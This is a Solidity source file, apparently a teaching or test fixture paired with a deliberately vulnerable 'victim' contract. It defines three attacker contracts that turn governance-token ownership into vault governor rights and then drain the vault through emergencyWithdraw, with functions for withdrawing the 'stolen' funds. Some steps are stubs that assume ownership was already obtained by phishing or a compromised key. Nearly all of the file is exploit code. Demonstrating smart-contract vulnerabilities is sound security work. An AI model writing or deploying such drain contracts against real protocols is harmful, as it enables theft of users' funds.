// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./Exploit_Chain_Risk_Victim.sol";

/*
 Exploit_Chain_Risk_Attacker.sol
 Purpose: Demonstrates exploitation of chained vulnerabilities across multiple contracts.
 
 Attack Chain:
 1. Gain control of GovToken ownership (through social engineering or vulnerable transfer)
 2. Use token ownership to change ProtocolVault governor
 3. Use governor privileges to drain vault funds
 4. Demonstrate cross-contract vulnerability propagation
*/

contract ExploitChainAttacker {
    GovToken public govToken;
    ProtocolVault public vault;
    address public owner;
    
    event AttackInitiated(string step, address target);
    event AttackSuccessful(string step, uint256 value);
    event ChainExploited(uint256 totalStolen);
    
    constructor(address _govToken, address payable _vault) {
        govToken = GovToken(_govToken);
        vault = ProtocolVault(_vault);
        owner = msg.sender;
    }
    
    // ATTACK STEP 1: Gain token ownership
    // In real scenario, this might happen through:
    // - Social engineering
    // - Compromised key
    // - Vulnerable ownership transfer logic
    // - Reentrancy in ownership transfer
    function step1_GainTokenOwnership() external {
        require(msg.sender == owner, "not owner");
        
        // Simulate gaining ownership (in real attack, owner would call transferOwner)
        emit AttackInitiated("Gaining Token Ownership", address(govToken));
        
        // Note: In actual attack, the current govToken owner must call:
        // govToken.transferOwner(address(this))
    }
    
    // ATTACK STEP 2: Use token ownership to change vault governor
    function step2_BecomeVaultGovernor() external {
        require(govToken.owner() == address(this), "not token owner");
        
        emit AttackInitiated("Becoming Vault Governor", address(vault));
        
        // Current vault governor (likely the token owner) can change governor
        // If this contract is token owner, it should also be vault governor
        // But we need vault to setGovernor to this contract
        
        // Note: This requires current governor to call:
        // vault.setGovernor(address(this))
    }
    
    // ATTACK STEP 3: Drain vault using governor privileges
    function step3_DrainVault() external {
        require(vault.governor() == address(this), "not governor");
        
        uint256 vaultBalance = address(vault).balance;
        
        emit AttackInitiated("Draining Vault", address(vault));
        
        // Use emergencyWithdraw to drain funds
        vault.emergencyWithdraw(address(this), vaultBalance);
        
        emit AttackSuccessful("Vault Drained", vaultBalance);
        emit ChainExploited(vaultBalance);
    }
    
    // COMBINED ATTACK: Execute full exploit chain
    // Assumes attacker has already gained initial token ownership
    function executeFullChain() external {
        require(msg.sender == owner, "not owner");
        
        // Step 1: Verify we have token ownership
        require(govToken.owner() == address(this), "need token ownership first");
        emit AttackInitiated("Full Chain Attack", address(govToken));
        
        // Step 2: If we're token owner and also vault governor, we can drain
        if (vault.governor() == address(this)) {
            uint256 vaultBalance = address(vault).balance;
            vault.emergencyWithdraw(address(this), vaultBalance);
            emit ChainExploited(vaultBalance);
        } else {
            revert("Not vault governor yet");
        }
    }
    
    // Withdraw stolen funds
    function withdrawStolen() external {
        require(msg.sender == owner, "not owner");
        uint256 balance = address(this).balance;
        payable(owner).transfer(balance);
    }
    
    receive() external payable {
        emit AttackSuccessful("Received Funds", msg.value);
    }
}

// Advanced attacker that exploits the full system
contract SystemExploiter {
    ExploitChainSystem public system;
    address public owner;
    
    event SystemCompromised(address govToken, address vault, uint256 stolen);
    event OwnershipGained(string contractType);
    
    constructor(address _system) {
        system = ExploitChainSystem(_system);
        owner = msg.sender;
    }
    
    // ATTACK: Exploit governance token weakness to gain system control
    function exploitGovernanceChain() external {
        require(msg.sender == owner, "not owner");
        
        GovToken govToken = system.govToken();
        ProtocolVault vault = system.vault();
        
        // Verify we have token ownership
        require(govToken.owner() == address(this), "need token ownership");
        emit OwnershipGained("GovToken");
        
        // If vault governor is the system contract, we can delegate to ourselves
        if (vault.governor() == address(system)) {
            // Since we own the govToken, we can call delegateGovernance
            system.delegateGovernance(address(this));
            
            // Now drain the vault
            uint256 balance = address(vault).balance;
            vault.emergencyWithdraw(address(this), balance);
            emit SystemCompromised(address(govToken), address(vault), balance);
        } else if (vault.governor() == address(this)) {
            // We're already governor, drain it
            uint256 balance = address(vault).balance;
            vault.emergencyWithdraw(address(this), balance);
            emit SystemCompromised(address(govToken), address(vault), balance);
        }
    }
    
    // ATTACK: Exploit protocol integration
    function exploitProtocolIntegration(address _protocol) external {
        require(msg.sender == owner, "not owner");
        
        VulnerableProtocol protocol = VulnerableProtocol(_protocol);
        
        // If we control govToken ownership, we can sync governance
        GovToken govToken = protocol.govToken();
        require(govToken.owner() == address(this), "need token ownership");
        
        // Sync governance to make us trusted
        protocol.syncGovernance();
        
        // Now we're trusted governor and can manipulate vault
        ProtocolVault vault = protocol.vault();
        require(vault.governor() == address(this), "should be governor");
        
        uint256 balance = address(vault).balance;
        vault.emergencyWithdraw(address(this), balance);
        
        emit SystemCompromised(address(govToken), address(vault), balance);
    }
    
    receive() external payable {}
    
    function withdraw() external {
        require(msg.sender == owner, "not owner");
        payable(owner).transfer(address(this).balance);
    }
}

// Attacker that demonstrates multi-step privilege escalation
contract PrivilegeEscalationAttacker {
    address public owner;
    
    event PrivilegeGained(string level, address target);
    event FundsExtracted(uint256 amount, address from);
    
    constructor() {
        owner = msg.sender;
    }
    
    // Step 1: Gain low-level access (token holder)
    function gainTokens(address _govToken) external {
        // In real scenario: buy tokens, receive airdrop, etc.
        emit PrivilegeGained("Token Holder", _govToken);
    }
    
    // Step 2: Exploit token ownership transfer vulnerability
    function exploitOwnershipTransfer(address _govToken) external {
        require(msg.sender == owner, "not owner");
        
        GovToken govToken = GovToken(_govToken);
        
        // Assume we socially engineered or exploited a way to become owner
        // In real attack: phishing, compromised key, vulnerable smart contract
        require(govToken.owner() == address(this), "need ownership first");
        
        emit PrivilegeGained("Token Owner", _govToken);
    }
    
    // Step 3: Use token ownership to control vault
    function escalateToVaultControl(address payable _vault) external {
        require(msg.sender == owner, "not owner");
        
        ProtocolVault vault = ProtocolVault(_vault);
        
        // If we're the governor or can become governor
        require(vault.governor() == address(this), "need governor rights");
        
        emit PrivilegeGained("Vault Governor", _vault);
    }
    
    // Step 4: Extract funds
    function extractFunds(address payable _vault) external {
        require(msg.sender == owner, "not owner");
        
        ProtocolVault vault = ProtocolVault(_vault);
        require(vault.governor() == address(this), "not governor");
        
        uint256 balance = address(vault).balance;
        vault.emergencyWithdraw(address(this), balance);
        
        emit FundsExtracted(balance, _vault);
    }
    
    // Demonstrate full escalation chain
    function demonstrateChain(address _govToken, address payable _vault) external view returns (string memory) {
        GovToken govToken = GovToken(_govToken);
        ProtocolVault vault = ProtocolVault(_vault);
        
        if (govToken.owner() == address(this)) {
            if (vault.governor() == address(this)) {
                return "Full control: Can drain vault";
            } else {
                return "Token owner: Can change governor";
            }
        } else {
            return "No control: Need token ownership";
        }
    }
    
    receive() external payable {}
    
    function withdraw() external {
        require(msg.sender == owner, "not owner");
        payable(owner).transfer(address(this).balance);
    }
}
